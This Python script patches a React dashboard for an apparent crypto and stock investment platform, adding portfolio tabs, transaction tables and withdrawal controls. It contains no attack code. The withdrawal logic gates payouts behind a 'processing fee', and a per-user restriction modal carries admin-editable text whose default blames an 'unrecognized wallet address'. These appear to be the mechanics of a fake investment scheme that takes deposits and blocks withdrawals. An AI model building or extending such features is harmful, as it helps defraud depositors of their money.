import re

with open('client/src/pages/Dashboard.tsx', 'r', encoding='utf-8') as f:
    content = f.read()

if 'import { Tabs' not in content:
    content = content.replace('import { Badge } from "@/components/ui/badge";', 'import { Badge } from "@/components/ui/badge";\nimport { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";')

new_tabs_content = '''  // Compute Crypto vs Stock Splits
  const cryptoAssets = ["BTC", "ETH", "SOL"];
  const stockAssets = ["TSLA", "AAPL", "GOOGL", "AMZN", "MSFT", "NVDA"];

  const cryptoBalance = cryptoAssets.reduce((sum, asset) => sum + getAssetBalance(asset), 0);
  const stockBalance = stockAssets.reduce((sum, asset) => sum + getAssetBalance(asset), 0);

  const cryptoInvested = investments
    .filter(inv => inv.status === 'active' && (!inv.assetType || inv.assetType === 'crypto' || cryptoAssets.includes(inv.asset)))
    .reduce((sum, inv) => sum + inv.amount, 0);

  const stockInvested = investments
    .filter(inv => inv.status === 'active' && (inv.assetType === 'stock' || stockAssets.includes(inv.asset)))
    .reduce((sum, inv) => sum + inv.amount, 0);

  const cryptoTransactions = realTransactions.filter((tx: any) => cryptoAssets.includes(tx.asset));
  const stockTransactions = realTransactions.filter((tx: any) => stockAssets.includes(tx.asset) || tx.assetType === 'stock');

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />

      {/* Withdrawal Restriction Modal */}
      <Dialog open={restrictionModalOpen} onOpenChange={setRestrictionModalOpen}>
        <DialogContent className="max-w-md mx-4 sm:mx-0">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-red-600 text-base sm:text-lg">
              <AlertTriangle className="h-5 w-5 sm:h-6 sm:w-6 shrink-0" />
              <span className="break-words">
                {user?.restrictionTitle || "Account Security Alert"}
              </span>
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-800 rounded-lg p-3 sm:p-4">
              <h4 className="font-semibold text-sm sm:text-base text-red-900 dark:text-red-100 mb-2 break-words">
                {user?.restrictionHeading || "Withdrawal Privileges Temporarily Suspended"}
              </h4>
              <p className="text-xs sm:text-sm text-red-800 dark:text-red-200 leading-relaxed break-words">
                {user?.restrictionMessage || 
                  "Our security system has detected that the last transaction (deposit) was made from an unrecognized wallet address associated with your account. " +
                  "As part of our commitment to safeguarding your assets, we have temporarily suspended withdrawal privileges pending verification. " +
                  "To restore full account access, please ensure all future deposits originate from your originally verified wallet address. " +
                  "We appreciate your understanding as we work to maintain the highest security standards for your protection."}
              </p>
            </div>
            <div className="flex items-start gap-2 text-xs text-muted-foreground">
              <Clock className="h-4 w-4 mt-0.5 shrink-0" />
              <p className="break-words">
                This restriction was applied on {user?.restrictedAt ? new Date(user.restrictedAt).toLocaleDateString() : 'recently'} and will remain in effect until verified.
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Processing Fee Verified Banner */}
      {showFeeVerifiedBanner && (
        <div className="bg-gradient-to-r from-green-600 to-green-700 text-white">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <CheckCircle className="h-6 w-6" />
                <div>
                  <p className="font-semibold">Withdrawal Processing Fee Verified!</p>
                  <p className="text-sm opacity-90">Your withdrawal privileges have been activated. You can now withdraw funds from your account.</p>
                </div>
              </div>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setShowFeeVerifiedBanner(false)}
                className="text-white hover:bg-white/20"
              >
                Dismiss
              </Button>
            </div>
          </div>
        </div>
      )}

      <Tabs defaultValue="crypto" className="w-full flex-1 flex flex-col">
        <div className="bg-gradient-to-r from-primary to-primary/80 text-primary-foreground pt-6 pb-2">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <TabsList className="grid w-full sm:w-[400px] grid-cols-2 bg-primary/20 text-primary-foreground mb-4">
              <TabsTrigger value="crypto" className="data-[state=active]:bg-white data-[state=active]:text-primary">Crypto Portfolio</TabsTrigger>
              <TabsTrigger value="stocks" className="data-[state=active]:bg-white data-[state=active]:text-primary">Stock Portfolio</TabsTrigger>
            </TabsList>
          </div>
        </div>

        {/* ======================= CRYPTO TAB ======================= */}
        <TabsContent value="crypto" className="mt-0 flex-1 flex flex-col">
          <div className="bg-gradient-to-r from-primary to-primary/80 text-primary-foreground pb-6 sm:pb-8">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
              {/* Withdrawal Restriction Warning Badge */}
              {user?.withdrawalRestricted && (
                <div className="mb-4">
                  <button
                    onClick={() => setRestrictionModalOpen(true)}
                    className="inline-flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg shadow-lg transition-colors"
                  >
                    <AlertTriangle className="h-4 w-4" />
                    <span className="font-semibold text-sm">Withdrawal Restricted</span>
                    <span className="text-xs opacity-90">Click for details</span>
                  </button>
                </div>
              )}

              <div className="space-y-6 sm:space-y-0 sm:flex sm:flex-wrap sm:justify-between sm:items-center sm:gap-6">
                <div className="space-y-1 text-center sm:text-left">
                  <p className="text-sm opacity-90">Total Crypto Balance</p>
                  <p className="text-3xl sm:text-4xl font-bold font-mono">
                    
                  </p>
                </div>

                <div className="flex justify-center sm:justify-start gap-4 sm:gap-6">
                  <div className="space-y-1 text-center sm:text-left">
                    <p className="text-xs sm:text-sm opacity-90">Available Crypto</p>
                    <p className="text-lg sm:text-2xl font-mono">
                      
                    </p>
                  </div>
                  <div className="space-y-1 text-center sm:text-left">
                    <p className="text-xs sm:text-sm opacity-90">Invested Crypto</p>
                    <p className="text-lg sm:text-2xl font-mono">
                      
                    </p>
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 w-full sm:w-auto">
                  <Button size="lg" variant="default" onClick={() => setDepositModalOpen(true)} className="w-full sm:w-auto">
                    <Upload className="h-4 w-4 sm:h-5 sm:w-5 mr-2" />
                    <span className="text-sm sm:text-base">Deposit</span>
                  </Button>

                  <Button
                    size="lg"
                    variant="secondary"
                    onClick={() => {
                      if (cryptoBalance <= 0) {
                        toast({
                          title: "No crypto assets available",
                          description: "Please deposit cryptocurrency assets (BTC, ETH, or SOL) first before making investments.",
                          variant: "destructive",
                        });
                        return;
                      }
                      setModalOpen(true);
                    }}
                    className="w-full sm:w-auto"
                  >
                    <Plus className="h-4 w-4 sm:h-5 sm:w-5 mr-2" />
                    <span className="text-sm sm:text-base">New Investment</span>
                  </Button>

                  <TooltipProvider>
                    <Tooltip open={!kycInfo.isVerified ? undefined : false}>
                      <TooltipTrigger asChild>
                        <span className="w-full sm:w-auto">
                          <Button
                            size="lg"
                            variant="outline"
                            onClick={() => {
                              if (!kycInfo.isVerified) return;
                              if (user?.withdrawalRestricted) {
                                toast({ title: "Withdrawal Restricted", description: "Your account has withdrawal restrictions. Please check the alert at the top of the page.", variant: "destructive" });
                                return;
                              }
                              if (hasCompletedInvestments() && !user?.processingFeePaid) {
                                setFeeExplanationModalOpen(true);
                              } else {
                                setWithdrawalModalOpen(true);
                              }
                            }}
                            disabled={cryptoBalance <= 0 || user?.withdrawalRestricted}
                            className="w-full sm:w-auto"
                          >
                            <Wallet className="h-4 w-4 sm:h-5 sm:w-5 mr-2" />
                            <span className="text-sm sm:text-base">Withdraw</span>
                          </Button>
                        </span>
                      </TooltipTrigger>
                      {!kycInfo.isVerified && (
                        <TooltipContent side="bottom">Go to Settings ? KYC Verification to complete your KYC before withdrawing.</TooltipContent>
                      )}
                    </Tooltip>
                  </TooltipProvider>
                </div>
              </div>
            </div>
          </div>
          
          <div className="flex-1 bg-background">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
              <Card className="p-4 sm:p-6 mb-6 sm:mb-8">
                <InvestmentGrowthChart />
              </Card>

              <Card className="p-4 sm:p-6">
                <h2 className="text-lg sm:text-xl font-bold mb-4 sm:mb-6">Crypto Transactions</h2>
                <div className="overflow-x-auto">
                  <table className="w-full min-w-[500px]">
                    <thead>
                      <tr className="border-b">
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Date</th>
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Type</th>
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Asset</th>
                        <th className="text-right py-2 px-2 text-xs font-semibold text-muted-foreground">Amount</th>
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Status</th>
                      </tr>
                    </thead>
                    <tbody>
                      {cryptoTransactions.length > 0 ? (
                        cryptoTransactions.map((tx: any) => (
                          <tr key={tx.id} className="border-b hover-elevate">
                            <td className="py-2 px-2 text-xs">{new Date(tx.date).toLocaleDateString()}</td>
                            <td className="py-2 px-2">
                              <div className="flex items-center gap-1">
                                {tx.type === "deposit" ? <ArrowDownRight className="h-3 w-3 text-green-600" /> : <ArrowUpRight className="h-3 w-3 text-red-600" />}
                                <span className="text-xs capitalize">{tx.type}</span>
                              </div>
                            </td>
                            <td className="py-2 px-2 text-xs font-mono">{tx.asset}</td>
                            <td className="py-2 px-2 text-xs font-mono text-right">{tx.type === "deposit" ? "+" : "-"}</td>
                            <td className="py-2 px-2">
                              <Badge variant={tx.status === "completed" ? "default" : tx.status === "pending" || tx.status === "approved" ? "secondary" : "destructive"} className="text-xs capitalize">{tx.status}</Badge>
                              <div>
                                <Button size="sm" variant="ghost" className="px-2 h-7 mt-1 text-xs" onClick={() => { setSelectedTx(tx); setDetailsOpen(true); }}>View</Button>
                              </div>
                            </td>
                          </tr>
                        ))
                      ) : (
                        <tr><td colSpan={5} className="py-8 text-center text-muted-foreground">No crypto transactions yet.</td></tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </Card>
            </div>
          </div>
        </TabsContent>

        {/* ======================= STOCKS TAB ======================= */}
        <TabsContent value="stocks" className="mt-0 flex-1 flex flex-col">
          <div className="bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white pb-6 sm:pb-8">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
              {/* Withdrawal Restriction Warning Badge */}
              {user?.withdrawalRestricted && (
                <div className="mb-4">
                  <button
                    onClick={() => setRestrictionModalOpen(true)}
                    className="inline-flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg shadow-lg transition-colors"
                  >
                    <AlertTriangle className="h-4 w-4" />
                    <span className="font-semibold text-sm">Withdrawal Restricted</span>
                    <span className="text-xs opacity-90">Click for details</span>
                  </button>
                </div>
              )}

              <div className="space-y-6 sm:space-y-0 sm:flex sm:flex-wrap sm:justify-between sm:items-center sm:gap-6">
                <div className="space-y-1 text-center sm:text-left">
                  <p className="text-sm text-slate-300 opacity-90">Total Stock Balance</p>
                  <p className="text-3xl sm:text-4xl font-bold font-mono">
                    
                  </p>
                </div>

                <div className="flex justify-center sm:justify-start gap-4 sm:gap-6">
                  <div className="space-y-1 text-center sm:text-left">
                    <p className="text-xs sm:text-sm text-slate-300 opacity-90">Available Stocks</p>
                    <p className="text-lg sm:text-2xl font-mono">
                      
                    </p>
                  </div>
                  <div className="space-y-1 text-center sm:text-left">
                    <p className="text-xs sm:text-sm text-slate-300 opacity-90">Invested Stocks</p>
                    <p className="text-lg sm:text-2xl font-mono">
                      
                    </p>
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 w-full sm:w-auto">
                  <Button size="lg" variant="secondary" onClick={() => setDepositModalOpen(true)} className="w-full sm:w-auto bg-white/10 hover:bg-white/20 text-white border-0">
                    <Upload className="h-4 w-4 sm:h-5 sm:w-5 mr-2" />
                    <span className="text-sm sm:text-base">Deposit via Crypto</span>
                  </Button>

                  <Button
                    size="lg"
                    variant="default"
                    onClick={() => {
                      if (stockBalance <= 0) {
                        toast({
                          title: "No stock assets available",
                          description: "Please deposit funds using crypto to invest in stocks.",
                          variant: "destructive",
                        });
                        return;
                      }
                      setStockModalOpen(true);
                    }}
                    className="w-full sm:w-auto bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-600 hover:to-cyan-600 text-white border-0"
                  >
                    <TrendingUp className="h-4 w-4 sm:h-5 sm:w-5 mr-2" />
                    <span className="text-sm sm:text-base">New Stock Investment</span>
                  </Button>
                </div>
              </div>
            </div>
          </div>
          
          <div className="flex-1 bg-background">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
              <Card className="p-4 sm:p-6 mb-6 sm:mb-8">
                <h2 className="text-lg sm:text-xl font-bold mb-4 sm:mb-6">Stock Holdings</h2>
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
                   {stockAssets.map(asset => (
                     <div key={asset} className="flex flex-col items-center justify-center p-4 rounded-lg bg-secondary/50 border">
                        <span className="text-sm font-semibold text-muted-foreground">{asset}</span>
                        <span className="text-lg font-mono font-bold"></span>
                     </div>
                   ))}
                </div>
              </Card>

              <Card className="p-4 sm:p-6">
                <h2 className="text-lg sm:text-xl font-bold mb-4 sm:mb-6">Stock Transactions</h2>
                <div className="overflow-x-auto">
                  <table className="w-full min-w-[500px]">
                    <thead>
                      <tr className="border-b">
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Date</th>
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Type</th>
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Asset</th>
                        <th className="text-right py-2 px-2 text-xs font-semibold text-muted-foreground">Amount</th>
                        <th className="text-left py-2 px-2 text-xs font-semibold text-muted-foreground">Status</th>
                      </tr>
                    </thead>
                    <tbody>
                      {stockTransactions.length > 0 ? (
                        stockTransactions.map((tx: any) => (
                          <tr key={tx.id} className="border-b hover-elevate">
                            <td className="py-2 px-2 text-xs">{new Date(tx.date).toLocaleDateString()}</td>
                            <td className="py-2 px-2">
                              <div className="flex items-center gap-1">
                                {tx.type === "deposit" ? <ArrowDownRight className="h-3 w-3 text-green-600" /> : <ArrowUpRight className="h-3 w-3 text-red-600" />}
                                <span className="text-xs capitalize">{tx.type}</span>
                              </div>
                            </td>
                            <td className="py-2 px-2 text-xs font-mono">{tx.asset}</td>
                            <td className="py-2 px-2 text-xs font-mono text-right">{tx.type === "deposit" ? "+" : "-"}</td>
                            <td className="py-2 px-2">
                              <Badge variant={tx.status === "completed" ? "default" : tx.status === "pending" || tx.status === "approved" ? "secondary" : "destructive"} className="text-xs capitalize">{tx.status}</Badge>
                              <div>
                                <Button size="sm" variant="ghost" className="px-2 h-7 mt-1 text-xs" onClick={() => { setSelectedTx(tx); setDetailsOpen(true); }}>View</Button>
                              </div>
                            </td>
                          </tr>
                        ))
                      ) : (
                        <tr><td colSpan={5} className="py-8 text-center text-muted-foreground">No stock transactions yet.</td></tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </Card>
            </div>
          </div>
        </TabsContent>
      </Tabs>
'''

start_marker = '  // Offer day banner and CTA removed per new UX'
end_marker = '      <Footer />'

if start_marker in content and end_marker in content:
    idx_start = content.find(start_marker)
    # Find the FIRST occurrence of <Footer /> AFTER idx_start
    idx_end = content.find(end_marker, idx_start)
    
    updated_content = content[:idx_start] + new_tabs_content + '\n' + content[idx_end:]
    
    with open('client/src/pages/Dashboard.tsx', 'w', encoding='utf-8') as f:
        f.write(updated_content)
    print("Successfully replaced Dashboard content.")
else:
    print("Could not find markers.")
